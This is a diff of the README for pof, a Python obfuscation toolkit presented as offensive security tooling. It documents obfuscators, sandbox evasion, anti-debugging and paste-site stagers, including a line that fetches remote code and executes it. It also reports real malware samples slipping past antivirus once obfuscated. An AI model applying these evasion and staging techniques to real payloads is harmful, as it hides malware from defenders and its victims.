@@ -4,20 +4,28 @@
 
 Test it at [pof.run](https://pof.run).
 
-Python Obfuscation Framework (pof), a complete Python offensive security toolkit to generate staged obfuscated payloads.
+Python Obfuscation Framework (pof), a complete Python offensive security toolkit
+to generate staged obfuscated payloads.
 
 pof will allow you to:
 
 - **Slow down static analysis** with layered obfuscation and novel techniques.
-- **Evade sandbox** by checking host information like MAC addresses, CPU count, memory count, uptime, and much more.
-- **Add guardrails** to ensure the payload only execute on the desired target host by verifying for username, hostname, domainame and much more.
+- **Evade sandbox** by checking host information like MAC addresses, CPU count,
+  memory count, uptime, and much more.
+- **Add guardrails** to ensure the payload only execute on the desired target
+  host by verifying for username, hostname, domainame and much more.
 - **Prevent dynamic analysis** by detecting debugging or tracing via malloc.
-- **Create staged payloads**, store stages inside images, on trusted sites, encrypt, compress, or encode them, and much more.
+- **Create staged payloads**, store stages inside images, on trusted sites,
+  encrypt, compress, or encode them, and much more.
 - **Enable automation** to produce numerous variant of the same payload.
 
-The main benefit of POF is customizability, you can generate your payload however you want, choose the obfuscation you want and combine them.
+The main benefit of POF is customizability, you can generate your payload
+however you want, choose the obfuscation you want and combine them.
 
-Most obfuscation work very well when combined. For example obfuscating an int from `42` to `int("42")` allows the string obfuscator to obfuscate it, turning it into `int("".join([chr(ord(i)-3)for i in'75']))`. And we now have multiple int and strings that we can once again obfuscate.
+Most obfuscation work very well when combined. For example obfuscating an int
+from `42` to `int("42")` allows the string obfuscator to obfuscate it, turning
+it into `int("".join([chr(ord(i)-3)for i in'75']))`. And we now have multiple
+int and strings that we can once again obfuscate.
 
 Example obfuscation:
 
@@ -133,17 +141,16 @@ More examples and usage can be found in `examples/` or in the section bellow.
 ## Effectiveness
 
 The tests are done using the default configuration of pof, no sandbox evasion
-technique was used with obfuscation. Also note that I haven't tested the
-malware to see if they still work, they should, but they may break with
-obfuscation.
+technique was used with obfuscation. Also note that I haven't tested the malware
+to see if they still work, they should, but they may break with obfuscation.
 
-Obfuscating a [Lazarus malware](https://bazaar.abuse.ch/sample/c3cb53c4a290bc9ab6c9eb825ed0ca38bb54bcc4a59f33be72becdff80cb091b/),
+Obfuscating a
+[Lazarus malware](https://bazaar.abuse.ch/sample/c3cb53c4a290bc9ab6c9eb825ed0ca38bb54bcc4a59f33be72becdff80cb091b/),
 we go from
 [18/63](https://www.virustotal.com/gui/file/c3cb53c4a290bc9ab6c9eb825ed0ca38bb54bcc4a59f33be72becdff80cb091b)
 to
 [0/63](https://www.virustotal.com/gui/file/2f427bc784e2a865d8f000c21f366cb8459842f97c56465cbe963f221b3e115a)
-on virus total:
-![](./examples/images/lazarus.png)
+on virus total: ![](./examples/images/lazarus.png)
 
 Obfuscating
 [RedTigerStealer](https://bazaar.abuse.ch/sample/9b4c37e3e994ad0222740e4c51dae48cc415957f8ad066da25e977e5031fa374/)
@@ -151,16 +158,14 @@ we go from
 [26/63](https://www.virustotal.com/gui/file/9b4c37e3e994ad0222740e4c51dae48cc415957f8ad066da25e977e5031fa374)
 to
 [1/62](https://www.virustotal.com/gui/file/5616cb69576b11fa4a024023bcf0f66e66b84f426067e597075dfcbba945d5e3)
-on virus total:
-![](./examples/images/red_tiger_stealer.png)
+on virus total: ![](./examples/images/red_tiger_stealer.png)
 
 Obfuscating [BTC-Clipper](https://github.com/NightfallGT/BTC-Clipper), we go
 from
 [13/64](https://www.virustotal.com/gui/file/9817d8de9bf7d2740b5b66e30ec1afdd98d7d119074a61cbba05514d4ebdc149)
 to
 [0/63](https://www.virustotal.com/gui/file/71631daa26fe6c2cf77d282a16f8b3fd31e4794b63709b956599563b95e64816)
-on virus total:
-![](./examples/images/btc_clipper.png)
+on virus total: ![](./examples/images/btc_clipper.png)
 
 Obfuscating a
 [Braodo malware](https://bazaar.abuse.ch/sample/b86e4bff935db9345cc1467e615ff4fbe292fae618ae927595d328cfd9e8a08f/),
@@ -168,20 +173,20 @@ we go from
 [10/61](https://www.virustotal.com/gui/file/b86e4bff935db9345cc1467e615ff4fbe292fae618ae927595d328cfd9e8a08f)
 to
 [0/63](https://www.virustotal.com/gui/file/8791188aaf7655093307e46fa68e3705ee7249cb81e05ea416ae96ad2fd2f0f2)
-on virus total:
-![](./examples/images/braodo.png)
+on virus total: ![](./examples/images/braodo.png)
 
-Obfuscating [Python-File-Stealer](https://github.com/KrizzhSriskantharajah-UK/Python-File-Stealer),
+Obfuscating
+[Python-File-Stealer](https://github.com/KrizzhSriskantharajah-UK/Python-File-Stealer),
 we go from
 [4/63](https://www.virustotal.com/gui/file/2fc798f1df42adae3af2f7d2623edc74f6b8f08a7ae16ef3b67305c4ad668c82)
 to
 [0/63](https://www.virustotal.com/gui/file/8d529e6ee2806986ca376a427d683fdf6980d6332134e4759d790d604d6b5dcb)
-on virus total:
-![](./examples/images/python_stealer.png)
+on virus total: ![](./examples/images/python_stealer.png)
 
 ## Install
 
-You can install POF with pip install, inside a container or try it online at [pof.run](https://pof.run):
+You can install POF with pip install, inside a container or try it online at
+[pof.run](https://pof.run):
 
 ```bash
 echo 'print("Hello, world!")' | curl -X POST -d @- https://pof.run
@@ -246,13 +251,15 @@ pof in.py -f obfuscator -k BuiltinsObfuscator |\
     pof -f stager -k PasteRsStager > out.py
 ```
 
-You can also use the Python API directly, you can find examples or see API usage bellow.
+You can also use the Python API directly, you can find examples or see API usage
+bellow.
 
 ## Examples
 
 These are examples of obfuscators of the script `print('Hello, world')`.
 
-To select an obfuscator use the flag `-f obfuscator` and `-k ObfuscatorClassName`.
+To select an obfuscator use the flag `-f obfuscator` and
+`-k ObfuscatorClassName`.
 
 To reproduce the examples you can use the following command:
 
@@ -309,14 +316,19 @@ if __name__ == '__main__':
 `DefinitionsObfuscator` obfuscate function names.
 
 > [!WARNING]
-> `NamesObfuscator` obfuscator is renaming variables, classes, functions, and imports. Right now this obfuscator can fail under very specific circumstances, see `pof/obfuscator/names.py`. There is an alternative implementation at `NamesRopeObfuscator` that uses `rope`, it's a work in progress and currently does not obfuscate variables declared inside functions.
+> `NamesObfuscator` obfuscator is renaming variables, classes, functions, and
+> imports. Right now this obfuscator can fail under very specific circumstances,
+> see `pof/obfuscator/names.py`. There is an alternative implementation at
+> `NamesRopeObfuscator` that uses `rope`, it's a work in progress and currently
+> does not obfuscate variables declared inside functions.
 
 Other very basic obfuscation functions are done by specific obfuscators like:
 
 - Removing comments with `CommentsObfuscator`.
 - Replacing exception messages with `ExceptionObfuscator`.
 - Reducing indentation to a single space with `IndentsObfuscator`.
-- Replace log messages with `LoggingObfuscator` or remove them with `LoggingRemoveObfuscator`.
+- Replace log messages with `LoggingObfuscator` or remove them with
+  `LoggingRemoveObfuscator`.
 - Remove empty lines with `NewlineObfuscator`.
 - Remove print statements with `PrintObfuscator`.
 
@@ -369,6 +381,30 @@ print(len('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'))
 
 # Boolean
 print((True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True))
+```
+
+#### BooleanObfuscator
+
+Source: `print(True)`
+
+```python
+# not False
+print(not False)
+
+# all([])
+print(all([]))
+
+# any([True])
+print(any([True]))
+
+# not not True
+print(not not True)
+
+# '' in ''
+print('' in '')
+
+# bool(1)
+print(bool(1))
 ```
 
 #### ConstantsObfuscator
@@ -446,15 +482,13 @@ __builtins__.__dict__.__getitem__('print')('Hello, world')
 
 #### ExtractVariablesObfuscator
 
-Extract variables in the same context level, meaning if inside a function will add the variable at the beginning of it.
+Extract variables in the same context level, meaning if inside a function will
+add the variable at the beginning of it.
 
 ```python
 var='Hello, world'
 print(var)
 ```
-
-> [!WARNING]
-> Right now this function is broken and can fail.
 
 #### CallObfuscator
 
@@ -502,6 +536,10 @@ if __name__=="__main__":
         print("This script is designed for Linux systems.")
 ```
 
+> [!NOTE]
+> This combines perfectly with a string obfuscator, since the function call
+> becomes ones, it's easy to obfuscate.
+
 #### ShiftObfuscator
 
 ```python
@@ -548,7 +586,11 @@ exec(wsdecode("​​​     ​​​  ​  ​​ ​  ​ ​​ ​​​  �
 
 #### RC4Obfuscator
 
-Warning: the RC4 obfuscator (and other cipher obfuscators) will combine both, the cipher text and the key in the same file, this is obviously not secure, and should never be used for security purposes. The idea behind this obfuscator is to fool humans, AV, EDR, network TAP etc. not to be secured and safe.
+> [!WARNING]
+> The RC4 obfuscator (and other cipher obfuscators) will combine both, the
+> cipher text and the key in the same file, this is obviously not secure, and
+> should never be used for security purposes. The idea behind this obfuscator is
+> to fool humans, AV, EDR, network TAP etc. not to be secured and safe.
 
 ```python
 import codecs
@@ -605,7 +647,44 @@ exec(decrypt( b'RkNfWkAcHnxTXVpbGBROW0RdUhMdPg==', b'61644494').decode())
 ```
 
 > [!WARNING]
-> Like for the RC4 cipher the XOR obfuscator shouldn't be used for security purposes, its main goal is to evade common security tools, not protect the information! Plus the XOR cipher is really weak and easy to crack.
+> Like for the RC4 cipher the XOR obfuscator shouldn't be used for security
+> purposes, its main goal is to evade common security tools, not protect the
+> information! Plus the XOR cipher is really weak and easy to crack.
+
+#### DeepEncryptionObfuscator
+
+Encrypt each function's source code using base64 encoding. The function body is
+replaced with a `exec(b64decode(...))` call that decrypts and executes the
+original code at runtime. This prevents the entire source code from being
+accessible at once in memory.
+
+Source in `examples/source.py`.
+
+```python
+from base64 import b64decode
+import os
+
+def get_linux_release_info():
+    r_dict=globals().copy()
+    r_dict.update(locals())
+    exec(b64decode( b'IiIiR2V0IExpbnV4IHJlbGVhc2UgaW5mbyBmcm9tIC9ldGMvb3MtcmVsZWFzZS4iIiIKCiMgQ2hlY2sgaWYgdGhlIGZpbGUgZXhpc3RzCnJlbGVhc2VfZmlsZSA9Ii9ldGMvb3MtcmVsZWFzZSIKCmlmIG5vdCBvcyAucGF0aCAuZXhpc3RzIChyZWxlYXNlX2ZpbGUgKToKICAgIHByaW50ICgiT1MgcmVsZWFzZSBmaWxlIG5vdCBmb3VuZC4gVGhpcyBtaWdodCBub3QgYmUgYSBMaW51eCBzeXN0ZW0uIikKICAgIHIgPU5vbmUgCgogICAgIyBEaWN0aW9uYXJ5IHRvIHN0b3JlIHJlbGVhc2UgaW5mb3JtYXRpb24KcmVsZWFzZV9pbmZvID17fQoKdHJ5IDoKIyBSZWFkIGFuZCBwYXJzZSB0aGUgZmlsZQogICAgd2l0aCBvcGVuIChyZWxlYXNlX2ZpbGUgLCJyIilhcyBmIDoKICAgICAgICBmb3IgbGluZSBpbiBmIDoKICAgICAgICAgICAgaWYgbm90IGxpbmUgb3IgIj0ibm90IGluIGxpbmUgOgogICAgICAgICAgICAgICAgY29udGludWUgCgogICAgICAgICAgICAgICAgIyBTcGxpdCBrZXkgYW5kIHZhbHVlCiAgICAgICAgICAgIGtleSAsdmFsdWUgPWxpbmUgLnN0cmlwICgpLnNwbGl0ICgiPSIsMSApCgogICAgICAgICAgICAjIFJlbW92ZSBxdW90ZXMgZnJvbSB2YWx1ZQogICAgICAgICAgICB2YWx1ZSA9dmFsdWUgLnN0cmlwICgiXCInXG4iKQoKICAgICAgICAgICAgIyBTdG9yZSBpbiBkaWN0aW9uYXJ5CiAgICAgICAgICAgIHJlbGVhc2VfaW5mbyBba2V5IF09dmFsdWUgCgogICAgICAgICAgICAjIFByaW50IGtleSByZWxlYXNlIGluZm9ybWF0aW9uCiAgICBwcmludCAoIlxuTGludXggUmVsZWFzZSBJbmZvcm1hdGlvbjoiKQogICAgcHJpbnQgKGYiRGlzdHJpYnV0aW9uOiB7cmVsZWFzZV9pbmZvIC5nZXQgKCdOQU1FJywnVW5rbm93bicpfSIpCiAgICBwcmludCAoZiJWZXJzaW9uOiB7cmVsZWFzZV9pbmZvIC5nZXQgKCdWRVJTSU9OJywnVW5rbm93bicpfSIpCiAgICBwcmludCAoZiJWZXJzaW9uIElEOiB7cmVsZWFzZV9pbmZvIC5nZXQgKCdWRVJTSU9OX0lEJywnVW5rbm93bicpfSIpCiAgICBwcmludCAoZiJQcmV0dHkgTmFtZToge3JlbGVhc2VfaW5mbyAuZ2V0ICgnUFJFVFRZX05BTUUnLCdVbmtub3duJyl9IikKCiAgICByID1yZWxlYXNlX2luZm8gCgpleGNlcHQgRXhjZXB0aW9uIGFzIGUgOgogICAgcHJpbnQgKGYiRXJyb3IgcmVhZGluZyByZWxlYXNlIGZpbGU6IHtlIH0iKQogICAgciA9Tm9uZSAKCgogICAgIyBNYWluIGV4ZWN1dGlvbgo='),r_dict)
+    if'r'not in r_dict:
+        return None
+    r_val=r_dict['r']
+    del r_dict
+    return r_val
+
+if __name__=="__main__":
+    if os.name=="posix"and os.path.exists("/etc/os-release"):
+        release_details=get_linux_release_info()
+    else:
+        print("This script is designed for Linux systems.")
+```
+
+> [!NOTE]
+> Functions containing `yield` or `super` are skipped and left unchanged. The
+> `return` statements inside the encrypted function body are replaced with
+> variable assignments to support return value propagation through `exec()`.
 
 #### Compression
 
@@ -701,7 +780,8 @@ print(oct.__doc__[8])
 print("Hello, world!")
 ```
 
-The list of comments available is inside a file, all the comments have been extracted from Python standard library.
+The list of comments available is inside a file, all the comments have been
+extracted from Python standard library.
 
 #### AddNewlinesObfuscator
 
@@ -762,7 +842,8 @@ exec(request.urlopen("https://pastebin.com/raw/...").read())
 > echo "print('Hello, world')" | pof -f stager -k PastebinStager api_dev_key=foo
 > ```
 
-The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is not uploaded to the same site. But `PasteRsStager` doesn't require an API key.
+The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is
+not uploaded to the same site. But `PasteRsStager` doesn't require an API key.
 
 #### RC4Stager
 
@@ -831,9 +912,11 @@ def quine():
 exec(b64decode(esource))
 ```
 
-This is most likely useless, a quine is a program that output its source code, and you can generate a quine from your source code with this.
+This is most likely useless, a quine is a program that output its source code,
+and you can generate a quine from your source code with this.
 
-Your script will still execute but a new function `quine` will be available, if you call it you'll have access to the source.
+Your script will still execute but a new function `quine` will be available, if
+you call it you'll have access to the source.
 
 Example usage:
 
@@ -844,10 +927,14 @@ python3 out2.py > out3.py
 diff out2.py out3.py
 ```
 
-The `out2.py` and `out3.py` files are identical, they both contain the source code, and the script `print(quine())`.
+The `out2.py` and `out3.py` files are identical, they both contain the source
+code, and the script `print(quine())`.
 
 > [!NOTE]
-> By default pof uses a custom `Untokenizer` that removes useless spaces (`NoSpaceUntokenizer` defined in `./pof/utils/tokens.py`), so first generation (in the example `out.py`) will not have spaces present in the subsquent outputs.
+> By default pof uses a custom `Untokenizer` that removes useless spaces
+> (`NoSpaceUntokenizer` defined in `./pof/utils/tokens.py`), so first generation
+> (in the example `out.py`) will not have spaces present in the subsquent
+> outputs.
 
 ### Format
 
@@ -867,7 +954,8 @@ print(out)
 
 ### Generators
 
-Generators are used to generate new names, they can be used to classes, variables, functions, constants or any other.
+Generators are used to generate new names, they can be used to classes,
+variables, functions, constants or any other.
 
 `BasicGenerator.alphabet_generator`:
 
@@ -938,7 +1026,8 @@ for _ in range(4):
 
 ### Homoglyphs
 
-[Homoglyphs](https://en.wikipedia.org/wiki/Homoglyph) are glyphs that have the same shape and appear identical. There is a generator to help create them.
+[Homoglyphs](https://en.wikipedia.org/wiki/Homoglyph) are glyphs that have the
+same shape and appear identical. There is a generator to help create them.
 
 Example of homoglyphs for `Hello, world!`:
 
@@ -971,7 +1060,8 @@ def get_homoglyphs():
 
 ## Python API
 
-The true power of pof is in chaining multiple different obfuscation techniques easily, there is a pretty simple Python API to do so.
+The true power of pof is in chaining multiple different obfuscation techniques
+easily, there is a pretty simple Python API to do so.
 
 For example this is a snippet of the default obfuscator:
 
@@ -1077,17 +1167,25 @@ class ExampleObfuscator(BaseObfuscator):
 print(ExampleObfuscator().obfuscate(open("source.py", "r").read()))
 ```
 
-In this example we can see that first we remove comments, logging, print statements, and change the content of exceptions. And then we start to obfuscate constants, names, globals, builtins, strings. Then strings and numbers multiple times, and we finally convert the tokens back to code.
+In this example we can see that first we remove comments, logging, print
+statements, and change the content of exceptions. And then we start to obfuscate
+constants, names, globals, builtins, strings. Then strings and numbers multiple
+times, and we finally convert the tokens back to code.
 
-By chaining multiple obfuscations techniques we can create very complex and custom output.
+By chaining multiple obfuscations techniques we can create very complex and
+custom output.
 
-Pof also provide evasions methods, detailed below, they are useful for quick and easy evasions, and can be used and customized to fit the need.
+Pof also provide evasions methods, detailed below, they are useful for quick and
+easy evasions, and can be used and customized to fit the need.
 
-For more example of how to use the pof Python API check the [examples/](./examples) directory.
+For more example of how to use the pof Python API check the
+[examples/](./examples) directory.
 
 ## Yara
 
-Yara rules can be used to detect malware, they can also be used to find interesting strings in Python source code. To check rules against source files and/or obfuscated files run:
+Yara rules can be used to detect malware, they can also be used to find
+interesting strings in Python source code. To check rules against source files
+and/or obfuscated files run:
 
 ```bash
 yara --no-warnings yara/python.yar file.py
@@ -1099,10 +1197,11 @@ Project directory structure:
 
 - `pof`: contains all the pof source code.
   - `pof/obfuscator`: contains obfuscators.
-  - `pof/stager`: contains satgers.
+  - `pof/stager`: contains stagers.
   - `pof/evasion`: contains evasions.
   - `pof/utils`: all shared code between stager, obfuscator and evasion.
-- `wip`: work in progress code that will eventually make its way inside the main code base.
+- `wip`: work in progress code that will eventually make its way inside the main
+  code base.
 - `tests`: unit tests for pof.
 - `scripts`: some useful scripts to develop or use pof.
 - `yara`: some yara rules to detect pof obfuscated code.
@@ -1158,7 +1257,8 @@ python3 -m twine check dist/*
 
 ## Python 2
 
-No effort is made to support Python 2, most obfuscator, stagers, and evasion should work out of the box, but they are not tested.
+No effort is made to support Python 2, most obfuscator, stagers, and evasion
+should work out of the box, but they are not tested.
 
 ## Alternatives
 
@@ -1183,11 +1283,9 @@ Other Python obfuscation projects:
 
 ## TODO
 
-- Ensure that the info in the readme are correct and still valide and working.
 - Add control flow obfuscation, add dead code, opaque predicates, control flow
   flattening.
 - Fix `NamesObfuscator`.
-- Fix multi line strings.
 - Add option to prepend a shebang, and add ability to customize it.
 
 ## License
